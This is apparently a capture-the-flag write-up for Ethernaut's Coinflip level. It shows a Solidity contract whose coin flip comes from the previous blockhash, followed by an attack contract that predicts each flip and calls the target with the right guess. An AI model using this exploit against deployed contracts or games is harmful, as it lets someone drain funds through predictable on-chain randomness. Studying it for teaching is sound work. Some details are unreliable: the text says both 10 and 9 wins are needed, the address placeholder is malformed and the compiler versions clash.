# Coinflip

Third Challenge description is as follows:

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

 Things that might help

- See the Help page above, section "Beyond the console"

Code:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

### Resolution

Ok, the goal of this challenge is somehow predict the outcome of the coin flip every time we call it, and win 9 times in a row! We can immediately see that this is related to the fact that true randomness is really hard to achieve in the blockchain context.

It seems that there's no true random source in the coin flip function, and it depends in public predictable data to calculate the coin flip, so what we could do is try to reproduce the same calculations before calling the `flip` method and then call the method with the calculated guess parameter. 

We'll need a deployed contract for this, as we need to grab the current block value and do some calculations. So we can open online IDE Remix and code our "AttackCoinFlip" contract to guess the coin flip. This is a fairly simple contract and I reckon might be more sofisticated or complex ways of doing this, but basically, we will need to deploy this contract and call 9 times the function `guessFlipValue()`:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol"; 

contract AttackCoinFlip {
    // Using SafeMath for aritmethic operations    
    using SafeMath for uint256;

    // The coin flip contract address:
    address private coinFlipAddress = {ETHERNAUT_COINFLIP_CONTRACT_ADDRESS}};

    // Same factor as the coinFlipAddress (we could also read it from contract directly)
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Function to pre-calculate the guess and then call the coinFlip contract with the guess
    function guessFlipValue() public {

        // Do the same predictable calculations that coinflip:
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool coinFlipGuess = coinFlip == 1 ? true : false;

        // Once we have the guess, call the coin flip contract through the abi:
         (bool success, bytes memory returnData) = coinFlipAddress.call(abi.encodeWithSignature("flip(bool)", coinFlipGuess));

        // Fail if something happens
        require(success, "Flip fail or returned false!");
                
    }
}

```

Don't forget that you can check how many times in a row are you winning via:
```
fromWei(await contract.consecutiveWins())
```

Once you successfully sent the 9 transactions, and the `consecutiveWins()` method shows 9 times, you can submit your instance! 💥 

## License

[MIT](https://choosealicense.com/licenses/mit/)